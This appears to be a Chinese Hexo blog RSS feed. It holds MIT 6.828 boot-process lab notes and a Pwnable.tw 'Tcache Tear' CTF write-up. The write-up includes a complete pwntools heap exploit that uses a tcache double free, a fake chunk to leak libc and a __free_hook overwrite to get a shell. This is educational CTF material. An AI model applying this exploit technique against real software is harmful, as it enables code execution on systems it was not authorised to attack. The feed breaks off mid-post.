<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>C7</title>
    <link>https://billyotry.github.io/</link>
    
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>雖不能至 心嚮往之</description>
    <pubDate>Sun, 24 Jan 2021 02:11:20 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>【MIT 6.828】Lab1-Exercise3</title>
      <link>https://billyotry.github.io/2021/01/23/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise3/</link>
      <guid>https://billyotry.github.io/2021/01/23/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise3/</guid>
      <pubDate>Sat, 23 Jan 2021 08:01:07 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Lab-1-Exercise-3：&quot;&gt;&lt;a href=&quot;#Lab-1-Exercise-3：&quot; class=&quot;headerlink&quot; title=&quot;Lab 1 Exercise 3：&quot;&gt;&lt;/a&gt;Lab 1 Exercise 3：&lt;/h2&gt;&lt;h3 id=&quot;任务&quot;&gt;&lt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="Lab-1-Exercise-3："><a href="#Lab-1-Exercise-3：" class="headerlink" title="Lab 1 Exercise 3："></a>Lab 1 Exercise 3：</h2><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>设置一个断点在地址0x7c00处，这是boot loader被加载的位置。然后让程序运行到这个直到这个断点。跟踪<code>boot/boot.S</code>文件的每一条指令，同时使用boot.S文件和系统为你反汇编出来的文件<code>obj/boot/boot.asm</code>。你也可以使用GDB的<code>x/i</code>指令来获取去任意一个机器指令的反汇编指令，把源文件boot.S文件和boot.asm文件以及在GDB反汇编出来的指令进行比较。</p><p>追踪到bootmain函数中，而且还要具体追踪到readsect()子函数里面。找出readsect() c语言程序的每一条语句所对应的汇编指令，回到bootmain()，然后找出把内核文件从磁盘读取到内存的那个for循环所对应的汇编语句。找出当循环结束后会执行哪条语句，在那里设置断点，继续运行到断点，然后运行完所有的剩下的语句。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>下面我们分别分析一下Exercise中涉及的两个重要文件，它们一起组成了boot loader。分别是<code>/boot/boot.S</code>和<code>/boot/main.c</code>文件。其中前者是一个汇编文件，后者是一个C语言文件。当BIOS运行完成后，CPU的控制权就转移到boot.S文件上，首先我们看一下boot.S文件。</p><h4 id="boot-boot-S"><a href="#boot-boot-S" class="headerlink" title="/boot/boot.S"></a>/boot/boot.S</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 .globl start</span><br><span class="line">2 start:</span><br><span class="line">3   .code16                # Assemble for 16-bit mode</span><br><span class="line">4   cli                    # Disable interrupts</span><br></pre></td></tr></table></figure><p>​    这几条指令是boot.S最开始的几句，其中cli是boot.S，同时也是boot loader的第一条指令。这条指令用于把所有的中断都关闭。因为BIOS运行期间有可能打开了中断。此时CPU工作在实模式下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5  cld                         # String operations increment</span><br></pre></td></tr></table></figure><p>​    这条指令用于指定发生的串处理操作的指针移动方向。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6  # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">7  xorw    %ax,%ax             # Segment number zero</span><br><span class="line">8  movw    %ax,%ds             # -&gt; Data Segment</span><br><span class="line">9  movw    %ax,%es             # -&gt; Extra Segment</span><br><span class="line">10 movw    %ax,%ss             # -&gt; Stack Segment</span><br></pre></td></tr></table></figure><p>​    这几条命令主要是把三个段寄存器ds，es，ss全部清零，因为经历了BIOS，操作系统不能保证这三个寄存器中存放的是什么数，这也是为进入保护模式做准备。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11  # Enable A20:</span><br><span class="line">12  #   For backwards compatibility with the earliest PCs, physical</span><br><span class="line">13  #   address line 20 is tied low, so that addresses higher than</span><br><span class="line">14  #   1MB wrap around to zero by default.  This code undoes this.</span><br><span class="line">15 seta20.1:</span><br><span class="line">16  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">17  testb   $0x2,%al                # test &#x3D; AND</span><br><span class="line">18  jnz     seta20.1</span><br><span class="line"></span><br><span class="line">19  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64</span><br><span class="line">20  outb    %al,$0x64</span><br><span class="line"></span><br><span class="line">21 seta20.2:</span><br><span class="line">22  inb     $0x64,%al               # Wait for not busy</span><br><span class="line">23  testb   $0x2,%al</span><br><span class="line">24  jnz     seta20.2</span><br><span class="line"></span><br><span class="line">25  movb    $0xdf,%al               # 0xdf -&gt; port 0x60</span><br><span class="line">26  outb    %al,$0x60</span><br></pre></td></tr></table></figure><p>​    这部分指令就是在准备把CPU的工作模式从实模式转换为保护模式。我们可以看到其中的inb，outb这样的IO端口命令。所以这些指令都是在对外部设备进行操作。从下面链接查询：</p><p>​    <a href="http://bochs.sourceforge.net/techspec/PORTS.LST">http://bochs.sourceforge.net/techspec/PORTS.LST</a></p><p>​    我们可以知道，0x64端口属于键盘控制器804x，名称是控制器读取状态寄存器。下面是各个位的含义</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13075840553/0" alt="image-20210123170158800"></p><p>​    所以16 ~ 18号指令是在不断的检测bit1。bit1的值代表了输入缓冲区是否满了，也就是说CPU传送给控制器的数据，控制器是否已经取走了，如果CPU想向控制器传送新的数据的话，必须先保证这一位为0。所以这三条指令会一直等待这一位变为0，才能继续向后运行。</p><p>​    当0x64端口准备好读入数据后，现在就可以写入数据了，所以19 ~ 20这两条指令是把0xd1这条数据写入到0x64端口中。当向0x64端口写入数据时，则代表向键盘控制器804x发送指令。这个指令将会被送给0x60端口。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077104980/0" alt="image-20210123221339018"></p><p>​    通过图中可见，D1指令代表下一次写入0x60端口的数据将被写入给804x控制器的输出端口。可以理解为下一个写入0x60端口的数据是一个控制指令。</p><p>​    然后21 ~ 24号指令又开始再次等待，等待刚刚写入的指令D1，是否已经被读取了。</p><p>​    如果指令被读取了，25 ~ 26号指令会向控制器输入新的指令，0xdf。通过查询我们可以看到0xdf指令的含义如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077116122/0" alt="image-20210123221731103"></p><p>​    指令的含义是使能A20线，代表可以进入保护模式了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">27   # Switch from real to protected mode, using a bootstrap GDT </span><br><span class="line">28   # and segment translation that makes virtual addresses  </span><br><span class="line">29   # identical to their physical addresses, so that the  </span><br><span class="line">30   # effective memory map does not change during the switch. </span><br><span class="line">31   lgdt    gdtdesc </span><br></pre></td></tr></table></figure><p>​    首先31号指令是把gdtdesc这个标识符的值送入全局映射描述符表寄存器GDTR中。这个GDT表是处理器工作于保护模式下一个非常重要的表。具体参照appendx文章中关于实模式和保护模式的介绍。至于这条指令的功能就是把关于GDT表的一些重要信息存放到CPU的GDTR寄存器中，其中包括GDT表的内存起始位置，以及GDT表的长度。这个寄存器由48位组成，其中低16位标识该表长度，高32位表示GDT表在内存中的起始地址。所以gdtdesc是一个标识符，标识着一个内存地址。从这个内存地址开始之后的6个字节中存放着GDT表的长度和起始地址。我们可以在文件末尾看到gdtdesc：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 # Bootstrap GDT</span><br><span class="line">2 .p2align 2                               # force 4 byte alignment</span><br><span class="line">3 gdt:</span><br><span class="line">4   SEG_NULL                               # null seg</span><br><span class="line">5   SEG(STA_X|STA_R, 0x0, 0xffffffff)      # code seg</span><br><span class="line">6   SEG(STA_W, 0x0, 0xffffffff)            # data seg</span><br><span class="line">7 </span><br><span class="line">8 gdtdesc:</span><br><span class="line">9   .word   0x17                           # sizeof(gdt) - 1</span><br><span class="line">10   .long   gdt                            # address gdt</span><br></pre></td></tr></table></figure><p>​    其中第三行的gdt是一个标识符，标识从这里开始就是GDT表了。可见这个GDT表中包括三个表项，分别代表三个段，null seg，code seg，data seg。由于xv6其实并没有使用分段基址，也就是说数据和代码都是写在一起的，所以数据段和代码段的起始地址都是0x0，大小都是0xffffffff=4GB。我们知道每个表项都是有三个字段的，那么这里第一个就是Flags字段，表示这个程序这个段的访问权限；中间的就是这个程序的这个段的起始地址；最后一个字段就是这个程序的这个段的大小。</p><p>​    在第4 ~ 6行是通过调用SEG()子程序来构造GDT表项的。这个子函数定义在mmu.h中，形式如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEG(type,base,lim)                    \</span></span><br><span class="line">                  .word (((lim) &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>), ((base) &amp; <span class="number">0xffff</span>);    \</span><br><span class="line">                  .byte (((base) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>), (<span class="number">0x90</span> | (type)),        \</span><br><span class="line">                  (<span class="number">0xC0</span> | (((lim) &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>)), (((base) &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure><p>​    可见函数需要三个参数，一个是type即这个段的访问权限，二是base，即这个段的起始地址，三是lim，即这个段的大小界限，每一个表项的结构如图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13077181536/0" alt="image-20210123223910104"></p><p>​    然后gdtdesc处就要存放这个GDT表的信息了，其中0x17是这个表的大小-1 = 23，至于为什么，问就是不知道，是官方规定的，紧接着就是GDT表的起始地址gdt。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32   movl    %cr0, %eax</span><br><span class="line">33   orl     $CR0_PE_ON, %eax</span><br><span class="line">34   movl    %eax, %cr0</span><br></pre></td></tr></table></figure><p>​    接下来，当加载完GDT表的信息到GDTR寄存器之后。紧跟着3个操作，32 ~ 34指令。这几部操作明显是在修改CR0寄存器的内容。CR0寄存器还有CR1 ~ CR3寄存器都是80x86的控制寄存器。其中$CR0_PE_ON的开头定义了，值为0x1。可见上面的操作就是把CR0寄存器的0bit位置1，CR0寄存器的0bit是保护模式启动位，把这一位置1代表保护模式启动。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">35  ljmp    $PROT_MODE_CSEG, $protcseg</span><br></pre></td></tr></table></figure><p>​    这只是一个简单的跳转指令，这条指令的目的在于把当前的运行模式切换为32位地址模式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protcseg:</span><br><span class="line">  # Set up the protected-mode data segment registers</span><br><span class="line">36  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector</span><br><span class="line">37  movw    %ax, %ds                # -&gt; DS: Data Segment</span><br><span class="line">38  movw    %ax, %es                # -&gt; ES: Extra Segment</span><br><span class="line">39  movw    %ax, %fs                # -&gt; FS</span><br><span class="line">40  movw    %ax, %gs                # -&gt; GS</span><br><span class="line">41  movw    %ax, %ss                # -&gt; SS: Stack Segment</span><br></pre></td></tr></table></figure><p>​    修改这些寄存器的值。这些寄存器都是段寄存器，如果刚加载完GDTR寄存器我们必须要重新加载所有的段寄存器的值，而其中CS段寄存器必须通过长跳转指令，即35号指令来进行加载。所有这些步骤是在第31号指令之后要做的，这样才能使GDTR的值生效。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Set up the stack pointer and call into C.</span><br><span class="line">42  movl    $start, %esp</span><br><span class="line">43  call bootmain</span><br></pre></td></tr></table></figure><p>​    接下来的指令就是要设置当前esp寄存器的值，然后准备正式跳转到main.c文件中的bootmain函数处。我们接下来分析一下这个函数的每一条指令。</p><h4 id="boot-main-c"><a href="#boot-main-c" class="headerlink" title="/boot/main.c"></a>/boot/main.c</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read 1st page off disk</span></span><br><span class="line"><span class="number">1</span> readseg((<span class="keyword">uint32_t</span>) ELFHDR, SECTSIZE*<span class="number">8</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>​    这里首先调用了一个函数readseg，这个函数的定义为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readseg(<span class="keyword">uint32_t</span> pa, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span><br></pre></td></tr></table></figure><p>​    它的功能从注释上来理解应该是，把距离内核起始地址offset个偏移量存储单元作为起始，将它和它之后的count字节的数据读出送入以pa为起始地址的内存物理地址处。</p><p>​    所以这条指令是把内核的第一个页（4096字节）的内容读取到内存地址ELFHDR（0x10000）处。其实完成这些相当于把操作系统映像文件的elf文件头部读取出来放入内存中。</p><p>​    读取完这个内核的elf头部信息后，需要对这个elf头部信息进行验证，并且也需要通过它获取一些重要信息。这里大致了解下elf头部，详细可见 <a href="http://wiki.osdev.org/ELF。">http://wiki.osdev.org/ELF。</a></p><p>​    elf文件：elf是一种文件格式，主要被用来把程序存放到磁盘上。是在程序被编译和链接后被创建出来的。一个elf文件包括多个段。对于一个可执行程序，通常包含存放代码的文本段（text section），用于存放全局变量的data段，存放字符串常量的rodata段。elf文件的头部就是用来描述这个elf文件如何在存储器中存储。这里需要注意，可链接文件和可执行文件会有不同的elf头部格式。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/23/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise3/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[Pwnable.tw]Tcache Tear</title>
      <link>https://billyotry.github.io/2021/01/23/[Pwnable.tw]Tcache%20Tear/</link>
      <guid>https://billyotry.github.io/2021/01/23/[Pwnable.tw]Tcache%20Tear/</guid>
      <pubDate>Sat, 23 Jan 2021 01:13:34 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;检查&quot;&gt;&lt;a href=&quot;#检查&quot; class=&quot;headerlink&quot; title=&quot;检查&quot;&gt;&lt;/a&gt;检查&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ file main</span><br><span class="line">main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;a273b72984b37439fd6e9a64e86d1c2131948f32, stripped</span><br><span class="line">$ checksec main</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;C7&#x2F;pwn&#x2F;tw&#x2F;tcache_tear&#x2F;main&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>64位动态链接，去符号表，got表不可写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ strings libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br></pre></td></tr></table></figure><p>libc为2.27</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先会输入一个名字会存到bss段上，然后就是常规的菜单题，malloc和free和info，这里的free只能对当前最新申请的chunk进行操作，info会打印bss段上0x20字节的内容。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul><li><code>free()</code>没有对指针清零，存在UAF</li><li><code>add()</code>中读入的<code>size-16</code>参数经过<code>sub_400A25()</code>后由有符号变成了无符号，如果size是小于16的，那么转换后会变成一个很大的无符号数，存在溢出。</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>做题的首要思路就是先考虑如何泄露出libc基址，一般的泄露方式就是申请一个chunk，释放后将其放入unsorted bin中。这里限制了chunk的size，即使我们填满了tcache后还是只能进入fast bin，没法进入unsorted bin中。默认情况下，tcache中的单链表个数是64个，64位下可容纳的最大内存块大小是1032(0x408)，故我们只要申请一个size大于0x408的堆块，然后free就会进入unsorted bin，而不会进入tcache。但是这里限制了申请大小，所以我们要伪造一个chunk，并将其释放。</p><p>这里需要注意的是<strong>除了伪造的size要大于0x408，并且伪堆块后面的数据也要满足基本的堆块格式，就是说还得伪造两个chunk。</strong>因为在free中，会对当前chunk后面的chunk进行一系列检查：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在 _int_free 函数中 </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; </span><br><span class="line"><span class="comment">/* get and clear inuse bit */</span> </span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br></pre></td></tr></table></figure><p>可以看到free函数对当前堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的xinuse位，到这里我们都以为只要伪造2个chunk就够了，但是nextchunk的inuse位的信息在nextchunk的nextchunk中，所以我们总共要伪造3个chunk。第一个chunk我们构造大小位0x500，第二个和第三个为0x20，它们的prev_inuse都为1，防止free后将它们合并。</p><p>这里我们具体的做法就是利用一开始的输入name，伪造好0x500的chunk后，在利用tcache的double free的特性（<strong>注意新版的2.27中加入了double free的检测</strong>），来达到任意地址申请堆块，相当于任意地址写，将后两个0x20的堆块伪造好，将伪造的0x500申请过来后释放即可，因为tcache不会check堆块的size，所以我们只需要fd指向的是伪造的chunk，不用担心size会被check。此时我们利用info功能将main_arena的地址打印出来后得到libc_base，然后继续利用tcache的double free将堆块申请到free_hook中，将free_hook改为one_gadget即可。</p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.pwnable.tw&#x27;,10207)</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;Data:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="number">0x602060</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name:&#x27;</span>,payload)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">payload = p64(name + <span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x50</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> +p64(<span class="number">0</span>)+ p64(<span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">payload = p64(name+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x20</span>,payload)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">info()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name :&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;free_hook= &quot;</span>+<span class="built_in">hex</span>(free_hook)</span><br><span class="line">local_og = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">remote_og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget = libc_base + local_og[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">0x40</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(one_gadget))</span><br><span class="line">free()</span><br><span class="line">p.sendline(<span class="string">&#x27;cd home&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cd tcache_tear&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里就是个常规的菜单题，但是对于我来说一个不懂的点就是对于free掉的chunk的check，就是要还得检查当前chunk的nextchunk，然后这里的nextchunk的相关信息在nextchunk的nextchunk，所以伪造的时候要伪造3个。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/23/[Pwnable.tw]Tcache%20Tear/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】Lab1-Exercise2</title>
      <link>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise2/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise2/</guid>
      <pubDate>Fri, 22 Jan 2021 08:41:44 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Lab-1-Exercise-2：&quot;&gt;&lt;a href=&quot;#Lab-1-Exercise-2：&quot; class=&quot;headerlink&quot; title=&quot;Lab 1 Exercise 2：&quot;&gt;&lt;/a&gt;Lab 1 Exercise 2：&lt;/h2&gt;&lt;h3 id=&quot;任务&quot;&gt;&lt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="Lab-1-Exercise-2："><a href="#Lab-1-Exercise-2：" class="headerlink" title="Lab 1 Exercise 2："></a>Lab 1 Exercise 2：</h2><h3 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h3><p>这里的练习是用gdb的’si’指令去调试并猜测它是做什么的</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先我们看第一条指令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 0xffff0:  ljmp $0xf000, $0xe05b  </span><br></pre></td></tr></table></figure><p>​    这是运行的第一条指令，是一条跳转指令，跳转到0xfe05b地址处，至于这个地址是怎么算出来的，在讲义中已经说过了。我们首先需要知道，PC机启动时，CPU运行在实模式下，而当进入操作系统内核后，就会设计到页表等的知识，这是在保护模式下运行了。实模式是早期CPU，比如8088处理器的工作模式，这类处理器由于只有20根地址线，所以它们只能访问1MB的内存空间。但是CPU也在不断的发展，之后的80286/80386已经具备32位地址总线，能够访问4GB内存空间，为了能够很好的管理这么大的内存空间，保护模式被研发出来。所以现代处理器都是工作在保护模式下的。但是为了实现向后兼容，即原来运行在8088处理器上的软件仍然能在现代处理器上运行，所以现代的CPU都是在启动时运行与实模式，启动完成后运行与保护模式。BIOS就是PC刚启动时运行的软件，所以它必然工作在实模式。</p><p>至于这两种工作模式的原理，可自行谷歌</p><p>实模式下指令中出现的地址都是采用（段基址：段内偏移）的形式，其中这两个字段的值，通常是存放寄存器中的。其中段基址必须放在段寄存器中，包括CS(代码段), DS(数据段), SS(堆栈段), ES(扩展段)。不同的段寄存器存放的是你程序不同的段的起始地址。</p><p>但是由于8088CPU中寄存器都是16位，而CPU地址总线是20位的，我们怎么通过16位的寄存器去拼接20位的地址呢？所以我们需要采用下面的方法：<strong>把段寄存器中的值左移4位（也就是乘16），形成20位段基址，然后和16位段内偏移相加，就得到了真实地址。</strong>比如上面的指令中段寄存器的内容为0xf000，所以真实地址为 0xf000&lt;&lt;4+0xe05b = 0xfe05b。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. 0xfe05b: cmpl $0x0, $cs:0x6ac8</span><br></pre></td></tr></table></figure><p>​    下一条指令，把0x0这个立即数和$cs:0x6ac8所代表的内存地址处的值所比较，<strong>至于为什么比较，俺不知道</strong>。其中$cs:0x6ac8就是我们刚刚介绍的实模式下地址形成的格式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. 0xfe062:  jne  0xfd2e1</span><br></pre></td></tr></table></figure><p>​    jne指令：如果ZF标志位为0的时候跳转，即上一条指令cmpl的结果不是0时跳转，也就是$cs:0x6ac8地址处的值不是0x0时跳转。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4. 0xfe066:  xor  %dx, %dx</span><br></pre></td></tr></table></figure><p>​    下条指令的地址是0xfe066，可见上面的跳转指令没有跳转。这条指令的功能是把dx寄存器清零。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5. 0xfe068:  mov  %dx %ss</span><br><span class="line">6. 0xfe06a:  mov  $0x7000, %esp</span><br><span class="line">7. 0xfe070:  mov  $0xf34d2, %edx</span><br><span class="line">8. 0xfe076:  jmp  0xfd15c</span><br><span class="line">9. 0xfd15c:  mov  %eax, %ecx</span><br></pre></td></tr></table></figure><p>​    接下来就是设置一些寄存器的值，<strong>具体含义俺不知道</strong>，注意第8条，进行了绝对跳转。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10. 0xfd15f:  cli</span><br></pre></td></tr></table></figure><p>​    <strong>关闭中断指令</strong>。这个比较好理解，启动时的操作是比较关键的，所以肯定是不能被中断的。这个关中断指令用于关闭那些可以屏蔽的中断。比如大部分硬件中断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11. 0xfd160:  cld</span><br></pre></td></tr></table></figure><p>​    设置方向标识(DF)为0，表示后续的串操作比如MOVS操作，内存地址的变化方向，如果为0代表从低地址值变为高地址。具体什么是串操作，自行谷歌。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12. 0xfd161:  mov  $0x8f, %eax</span><br><span class="line">13. 0xfd167:  out  %al, $0x70</span><br><span class="line">14. 0xfd169:  in  $0x71, %al</span><br></pre></td></tr></table></figure><p>​    这三个操作中涉及到两个新指令out，in。这两个操作用于操作IO端口的。这种IO端口的操作后续会经常接触到，这里大致说下。</p><p>​    CPU与外部设备通讯时，通常是通过访问、修改设备控制器中的寄存器来实现的。那么这些位于设备控制器中的寄存器也叫做<strong>IO端口</strong>。为了方便管理，80x86CPU采用IO端口单独编址的方式，即所有设备的端口都被命名到一个IO端口地址空间中。这个空间是独立于内存地址空间的。所以必须采用和访问内存的指令不一样的指令来访问端口。</p><p>​    所以这里引入in，out操作：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in 